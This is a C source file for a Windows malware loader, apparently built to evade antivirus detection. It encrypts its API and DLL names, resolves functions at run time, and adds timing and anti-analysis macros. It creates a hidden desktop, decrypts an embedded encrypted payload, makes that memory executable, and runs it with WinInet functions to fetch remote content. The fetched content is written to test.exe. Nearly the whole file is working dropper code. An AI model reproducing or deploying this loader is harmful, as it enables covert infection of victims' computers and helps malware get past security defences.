#include "loader.h"

#include "payload_enc.c"
#include "entropy_low.c"
// #include "dynamic_strings.c"



void DBGLG(char buf[], ...){
    #ifdef DEBUG_print
    va_list args;
    int num = 0;
    for(int i = 0; buf[i] != '\0'; ++i){
        num += buf[i] == ':';
    }
    va_start(args, buf);
    if (!num) printf("%s",buf);
    else printf("%s%d\n",buf, va_arg(args, int));

    va_end(args);
    #endif
}


// unsigned long long args[] = {InternetOpen, InternetOpenUrlA, InternetReadFile, InternetCloseHandle, NULL, NULL, stepOverExit};
unsigned long long args[] = {NULL, NULL, NULL, NULL, NULL, NULL, stepOverExit};



// // unsigned char cMessageBoxW[] = "MessageBoxW";
// unsigned char cMessageBoxW[] = {168, 129, 221, 24, 74, 113, 150, 47, 30, 79, 118, 101, 42, 90, 128, 97};
// // unsigned char cVirtualProtect[] = "VirtualProtect";
// unsigned char cVirtualProtect[] = {49, 123, 147, 165, 62, 217, 203, 81, 145, 146, 63, 90, 199, 246, 110, 67};
// // unsigned char cCreateFileW[] = "CreateFileW";
// unsigned char cCreateFileW[] = {145, 165, 214, 155, 31, 33, 200, 86, 127, 96, 71, 31, 85, 33, 229, 47};
// // unsigned char cWriteFile[] = "WriteFile";
// unsigned char cWriteFile[] = {114, 28, 5, 8, 164, 12, 94, 207, 167, 188, 204, 27, 254, 251, 121, 101};
// // unsigned char cCloseHandle[] = "CloseHandle";
// unsigned char cCloseHandle[] = {176, 23, 178, 109, 211, 73, 105, 222, 227, 159, 70, 56, 64, 46, 167, 119};
// // unsigned char cGetSystemTime[] = "GetSystemTime";
// unsigned char cGetSystemTime[] = {137, 254, 100, 169, 124, 180, 252, 114, 63, 216, 61, 185, 50, 10, 239, 157};
// // unsigned char cInternetOpenW[] = "InternetOpenW";
// unsigned char cInternetOpenW[] = {243, 25, 220, 159, 178, 128, 136, 33, 64, 126, 61, 196, 45, 116, 145, 9};
// // unsigned char cInternetOpenUrlA[] = "InternetOpenUrlA";
// unsigned char cInternetOpenUrlA[] = {186, 106, 249, 108, 123, 174, 27, 110, 179, 107, 172, 163, 253, 17, 54, 206, 253, 228, 251, 174, 74, 9, 224, 32, 239, 247, 34, 150, 159, 131, 131, 43};
// // unsigned char cInternetReadFile[] = "InternetReadFile";
// unsigned char cInternetReadFile[] = {194, 222, 62, 176, 54, 164, 50, 65, 138, 108, 123, 98, 153, 212, 71, 1, 253, 228, 251, 174, 74, 9, 224, 32, 239, 247, 34, 150, 159, 131, 131, 43};
// // unsigned char cInternetCloseHandle[] = "InternetCloseHandle";
// unsigned char cInternetCloseHandle[] = {221, 49, 197, 109, 65, 61, 200, 142, 77, 97, 245, 34, 53, 209, 192, 66, 58, 35, 21, 25, 37, 178, 30, 99, 208, 139, 145, 41, 27, 219, 166, 160};
// // unsigned char cGetLastError[] = "GetLastError";
// unsigned char cGetLastError[] = {217, 107, 96, 228, 145, 102, 172, 33, 70, 106, 54, 62, 155, 112, 77, 172};
// // unsigned char cCreateDisktopW[] = "CreateDesktopW";
// unsigned char cCreateDisktopW[] = {177, 128, 82, 146, 134, 254, 213, 68, 40, 104, 88, 52, 82, 57, 45, 2};
// // unsigned char cSetThreadDesktop[] = "SetThreadDesktop";
// unsigned char cSetThreadDesktop[] = {127, 161, 193, 24, 215, 140, 217, 47, 147, 178, 23, 132, 120, 84, 92, 71, 253, 228, 251, 174, 74, 9, 224, 32, 239, 247, 34, 150, 159, 131, 131, 43};
// // unsigned char cCreateThread[] = "CreateThread";
// unsigned char cCreateThread[] = {102, 194, 165, 161, 58, 95, 82, 113, 79, 95, 17, 72, 130, 236, 99, 239};
// // unsigned char cCloseDesktop[] = "CloseDesktop";
// unsigned char cCloseDesktop[] = {126, 203, 216, 60, 164, 173, 199, 48, 69, 66, 16, 158, 188, 210, 128, 46};
// // unsigned char cExitProcess[] = "ExitProcess";
// unsigned char cExitProcess[] = {229, 169, 105, 183, 183, 207, 79, 143, 91, 28, 190, 96, 176, 180, 3, 250};

// unsigned char cRtlExitUserProcess[] = {78, 101, 15, 20, 26, 62, 203, 237, 3, 53, 16, 222, 165, 62, 36, 89, 124, 51, 30, 175, 49, 120, 213, 212, 246, 159, 137, 192, 173, 83, 145, 0};
// // unsigned char cLdrLoadDll[] = "LdrLoadDll";
// unsigned char cLdrLoadDll[] = {49, 228, 28, 71, 6, 45, 100, 249, 227, 19, 214, 164, 11, 101, 189, 4};

// // unsigned char cRtlInitUnicodeString[] = "RtlInitUnicodeString";
// unsigned char cRtlInitUnicodeString[] = {109, 184, 147, 225, 133, 173, 34, 117, 184, 100, 240, 44, 5, 198, 206, 132, 248, 181, 148, 87, 90, 161, 186, 250, 26, 95, 146, 175, 39, 108, 125, 167};

// // unsigned short sKernelbase[] = L"kernelbase.dll";
// unsigned char sKernelbase[] = {199, 147, 34, 232, 195, 9, 37, 179, 147, 55, 218, 145, 221, 41, 18, 137, 93, 82, 87, 171, 212, 20, 124, 206, 207, 141, 41, 22, 222, 127, 188, 44};
// // unsigned short sWininet[] =L"wininet.dll";
// unsigned char sWininet[] = {17, 27, 148, 101, 114, 136, 28, 15, 27, 155, 27, 122, 141, 214, 221, 211, 164, 45, 74, 3, 172, 195, 110, 115, 90, 101, 184, 123, 169, 85, 215, 156};
// // unsigned short sUser32[] = L"user32.dll";
// unsigned char sUser32[] = {205, 212, 38, 16, 97, 187, 229, 248, 29, 163, 209, 9, 192, 87, 4, 109, 246, 31, 198, 87, 10, 76, 51, 25, 142, 185, 30, 1, 222, 98, 203, 210};
// // unsigned short sNtdll[] = L"ntdll.dll";
// unsigned char sNtdll[] = {107, 1, 99, 198, 207, 23, 147, 227, 71, 117, 113, 11, 110, 218, 96, 212, 116, 200, 22, 181, 218, 196, 123, 19, 106, 154, 216, 114, 253, 122, 41, 225};

// // unsigned short ntdll_char[] = L"C:\\Windows\\SYSTEM32\\ntdll.dll";
// unsigned char ntdll_full_path[] = {185, 19, 197, 214, 49, 66, 211, 67, 202, 166, 31, 14, 142, 157, 214, 242, 247, 221, 241, 155, 254, 135, 58, 254, 250, 39, 119, 119, 156, 230, 92, 83, 204, 76, 191, 100, 103, 159, 68, 45, 82, 196, 222, 169,178, 221, 165, 222, 98, 187, 12, 224, 251, 92, 155, 29, 252, 4, 12, 134, 58, 76, 217, 228};
// FIXME: GetEnvironmentVariableA("WINDIR", buf, sz) instead of C:\\

HMODULE Kernel32Module;
HMODULE WininetModule;
HMODULE user32Module;
pCreateDesktopW _CreateDesktopW;
pSetThreadDesktop _SetThreadDesktop;
MessageBoxWFunc _MessageBoxW;
pVirtualProtect _VirtualProtect;
pCreateFileW _CreateFileW;
pWriteFile _WriteFile;
pCloseHandle _CloseHandle;
pInternetOpenW _InternetOpen;
pInternetOpenUrlA _InternetOpenUrlA;
pInternetReadFile _InternetReadFile;
pInternetCloseHandle _InternetCloseHandle;
pGetLastError _GetLastError;
pCreateThread _CreateThread;
pCloseHandle _CloseHandle;
pCloseDesktop _CloseDesktop;
pGetSystemTime _GetSystemTime = NULL;
pExitProcess _ExitProcess;

extern unsigned char cMessageBoxW[];
extern unsigned char cVirtualProtect[];
extern unsigned char cCreateFileW[];
extern unsigned char cWriteFile[];
extern unsigned char cCloseHandle[];
extern unsigned char cGetSystemTime[];
extern unsigned char cInternetOpenW[];
extern unsigned char cInternetOpenUrlA[];
extern unsigned char cInternetReadFile[];
extern unsigned char cInternetCloseHandle[];
extern unsigned char cGetLastError[];
extern unsigned char cCreateDisktopW[];
extern unsigned char cSetThreadDesktop[];
extern unsigned char cCreateThread[];
extern unsigned char cCloseDesktop[];
extern unsigned char cExitProcess[];
extern unsigned char cRtlExitUserProcess[];
extern unsigned char cLdrLoadDll[];
extern unsigned char cRtlInitUnicodeString[];
extern unsigned char sKernelbase[];
extern unsigned char sWininet[];
extern unsigned char sUser32[];
extern unsigned char sNtdll[];
extern unsigned char sntdll_full_path[];
extern unsigned char MasterKeyStrings[];
extern unsigned char MasterKeyPayload[];



volatile int mutex_setupWinApi = 0;
HDESK desktop;

DWORD WINAPI setupWinApi(){
    // DYNAMIC_RETURN;
    int x = 1;
    int y = 187;
    while (mutex_setupWinApi != 1){
        x = y * x & 4 % 6;
        y = x * x;
    }
    _SetThreadDesktop(desktop);
    _MessageBoxW = (MessageBoxWFunc)(_GetProcAddress(user32Module, cMessageBoxW));
    _CloseDesktop = (pCloseDesktop)_GetProcAddress(user32Module, cCloseDesktop);
    _VirtualProtect = (pVirtualProtect)_GetProcAddress(Kernel32Module, cVirtualProtect);
    _CreateFileW = (pCreateFileW)_GetProcAddress(Kernel32Module, cCreateFileW);
    _WriteFile = (pWriteFile)_GetProcAddress(Kernel32Module, cWriteFile);
    // DYNAMIC_RETURN;
    _CloseHandle = (pCloseHandle)_GetProcAddress(Kernel32Module, cCloseHandle);
    _InternetOpen = (pInternetOpenW)_GetProcAddress(WininetModule, cInternetOpenW);
    _InternetOpenUrlA = (pInternetOpenUrlA)_GetProcAddress(WininetModule, cInternetOpenUrlA);
    _InternetReadFile = (pInternetReadFile)_GetProcAddress(WininetModule, cInternetReadFile);
    _InternetCloseHandle = (pInternetCloseHandle)_GetProcAddress(WininetModule, cInternetCloseHandle);
    _GetLastError = (pGetLastError)_GetProcAddress(Kernel32Module,cGetLastError);
    _ExitProcess = (pExitProcess)(cRtlExitUserProcess);

    x = y * x & 4 % 6;
    y = x * x;
    mutex_setupWinApi = 0;
    return x + y;
}

int pseudo_main(){
    // DYNAMIC_RETURN;
    int sz = 0;
    payload p;
    DWORD threadId;
    HANDLE threadHandle;
    unsigned char KeyList[176];
    DWORD junk[sizeof(PDWORD)];
    unsigned char execute_me[sizeof(payload_enc_bytes)];
    unsigned char buf[200 * 1024];
    int x = 58;
    int y = 18;

    #ifndef DEBUG
    TOMFOOLERY
    #endif

    INIT_CONST();
    KeyScheduler(MasterKeyStrings, KeyList);
    unsigned char* decryptme[] = {cExitProcess, cCloseDesktop, cMessageBoxW,
                                     cVirtualProtect, cCreateFileW,
                                     cWriteFile, cCloseHandle, cInternetOpenW,
                                     cInternetOpenUrlA, cInternetOpenUrlA + 16,
                                     cInternetReadFile, cInternetReadFile + 16,
                                     cInternetCloseHandle, cInternetCloseHandle + 16,
                                     cGetLastError, cCreateDisktopW, cSetThreadDesktop,
                                     cSetThreadDesktop + 16, cCreateThread, cGetSystemTime,
                                     cRtlExitUserProcess, cRtlExitUserProcess + 16,
                                     sKernelbase, sKernelbase + 16, sUser32, sUser32 + 16,
                                     sWininet, sWininet + 16, sNtdll, sNtdll + 16,
                                     sntdll_full_path, sntdll_full_path + 16,
                                     sntdll_full_path + 32, sntdll_full_path + 48,
                                     cLdrLoadDll, cRtlInitUnicodeString,
                                     cRtlInitUnicodeString + 16, MasterKeyPayload};
    // FIXME: Change hardcoded i parameter every time you update decryptme
    for (int i = 0; i < sizeof(decryptme)/8; ++i){
        Decrypt(decryptme[i], KeyList);
    }
    Kernel32Module = _LoadLibrary(sKernelbase);
    WininetModule = _LoadLibrary(sWininet);
    user32Module = _LoadLibrary(sUser32);
    _CreateThread = (pCreateThread)_GetProcAddress(Kernel32Module, cCreateThread);
    _CreateDesktopW = (pCreateDesktopW)_GetProcAddress(user32Module, cCreateDisktopW);
    _SetThreadDesktop = (pSetThreadDesktop)_GetProcAddress(user32Module, cSetThreadDesktop);
    _GetSystemTime = (pGetSystemTime)_GetProcAddress(Kernel32Module, cGetSystemTime);
    #ifndef DEBUG
    RECORD_TIME
    #endif
    if (!_CreateThread){
        unsigned __int64 i = MessageBoxA(NULL, NULL, NULL, NULL);
        i = GdiplusStartup(NULL, NULL, NULL);
        RegisterClass(NULL);
        CreateWindowW(NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL);
        ShowWindow(NULL, NULL);
        UpdateWindow(NULL);
        GdiplusShutdown(NULL);
    }
    if ((threadHandle = _CreateThread(NULL, 0, setupWinApi, NULL, 0, &threadId)) == NULL){
        return -89;
    }
    if ((desktop = _CreateDesktopW(L"Lolers", NULL, NULL, 0, GENERIC_ALL, NULL)) == NULL){
        return -851;
    }
    mutex_setupWinApi = 1;
    while (mutex_setupWinApi == 1){
        x = y * x & 4 % 6;
        #ifndef DEBUG
        CHECK_TIME
        #endif
        y = x * x ^ 17;
    }
    _CloseHandle(threadHandle);
    _CloseDesktop(desktop);
    args[0] = _InternetOpen;
    args[1] = _InternetOpenUrlA;
    args[2] = _InternetReadFile;
    args[3] = _InternetCloseHandle;
    args[4] = buf;
    args[5] = &sz;
    HANDLE hFile = _CreateFileW(L"./test.exe", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        return 1;
    }
    // RANDOM_BYTE
    #ifndef DEBUG
    SHORT_JMP
    #endif
    KeyScheduler(MasterKeyPayload, KeyList);
    memcpy(execute_me, payload_enc_bytes, sizeof(payload_enc_bytes));
    for (int i = 0; i < sizeof(payload_enc_bytes); i += 16){
        Decrypt(execute_me + i, KeyList);
    }
    #ifndef DEBUG
    CHECK_TIME
    #endif
    _VirtualProtect(execute_me, sizeof(payload_enc_bytes),PAGE_EXECUTE_READWRITE, &junk);
    #ifndef DEBUG
    CHECK_TIME
    #endif
    p = (payload)(execute_me);
    #ifndef DEBUG
    CHECK_TIME
    #endif
    p(args);
    DWORD bytesWritten;
    BOOL result = _WriteFile(hFile, buf, (DWORD)sz, &bytesWritten, NULL);
    if (!result) {
        _CloseHandle(hFile);
        return 1;
    }
    _CloseHandle(hFile);
    #ifdef DEBUG
    _MessageBoxW(NULL, L"OK", L"OK", MB_OK);
    #endif
    return x + y;
}

void WinMainCRTStartup(){
    // DYNAMIC_RETURN;
    pseudo_main();
    _ExitProcess(0);
}